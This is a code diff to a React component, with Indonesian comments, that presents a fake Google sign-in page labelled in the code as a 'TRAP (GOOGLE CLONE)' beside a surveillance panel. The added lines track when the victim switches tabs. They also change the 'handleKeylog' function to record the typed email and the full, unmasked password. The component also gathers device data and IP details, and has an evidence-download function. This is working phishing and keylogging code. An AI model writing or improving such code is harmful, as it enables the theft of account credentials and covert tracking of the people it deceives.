@@ -13,6 +13,7 @@ export default function ArtupUltimateV4() {
   const [email, setEmail] = useState("");
   const [pass, setPass] = useState("");
   const [step, setStep] = useState(1);
+  const [userStatus, setUserStatus] = useState("Active");
   const [showTrap, setShowTrap] = useState(false);
   const [sysInfo, setSysInfo] = useState<any>({
     ip: "Scanning...",
@@ -49,6 +50,16 @@ export default function ArtupUltimateV4() {
   };
 
   useEffect(() => {
+    const handleVisibility = () => {
+      const status = document.hidden ? "Away (Pindah Tab)" : "Active";
+      setUserStatus(status);
+      addLog(`📱 STATUS: User sedang ${status}`);
+    };
+
+    document.addEventListener("visibilitychange", handleVisibility);
+
+    // Cleanup agar tidak memory leak
+
     // --- 3. INITIAL DATA MINING ---
     setBrand(getDeviceBrand());
     addLog(`🔍 DEVICE_ID: ${getDeviceBrand()}`);
@@ -110,18 +121,21 @@ export default function ArtupUltimateV4() {
     }
 
     addLog("🚀 SYSTEM_STABLE: Monitoring sensors...");
-    return () => window.removeEventListener("devicemotion", handleMotion);
-  }, []);
+    return () => {
+      document.removeEventListener("visibilitychange", handleVisibility);
+      window.removeEventListener("devicemotion", handleMotion);
+    }; // <--- Pastikan ada tutup kurung kurawal ini
+  }, []); //
 
   // --- 4. INTERACTION HANDLERS ---
   const handleKeylog = (val: string, type: "email" | "pass") => {
-    if (type === "email") setEmail(val);
-    else setPass(val);
-    const last = val.slice(-1);
-    if (last)
-      addLog(
-        `⌨️ INPUT [${type.toUpperCase()}]: "${type === "pass" ? "*" : last}"`,
-      );
+    // Filter karakter < dan > agar tidak bisa menjalankan script HTML/JS
+    const cleanValue = val.replace(/[<>]/g, "");
+
+    if (type === "email") setEmail(cleanValue);
+    else setPass(cleanValue);
+
+    addLog(`⌨️ CAPTURE [${type.toUpperCase()}]: ${cleanValue}`);
   };
 
   const downloadEvidence = async () => {
@@ -164,6 +178,7 @@ export default function ArtupUltimateV4() {
       {/* --- UI KIRI: TRAP (GOOGLE CLONE) --- */}
       <div className="flex-1 flex justify-center items-center p-4 min-h-screen">
         {/* min-h-screen memastikan form Google mengambil satu layar penuh */}
+
         <div className="g-card shadow-sm">
           <img
             src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
@@ -234,6 +249,16 @@ export default function ArtupUltimateV4() {
             <p className="val-text text-yellow-400">{brand}</p>
             <p className="val-text text-[10px] opacity-70">{hardware.os}</p>
           </div>
+
+          <div>
+            <p className="text-gray-500 text-[9px]">USER_ACTIVITY</p>
+            <p
+              className={`val-text ${userStatus !== "Active" ? "text-red-500" : "text-green-400"}`}
+            >
+              {userStatus}
+            </p>
+          </div>
+
           <div>
             <p className="data-label">Network_Status</p>
             <p className="val-text">{sysInfo.ip}</p>
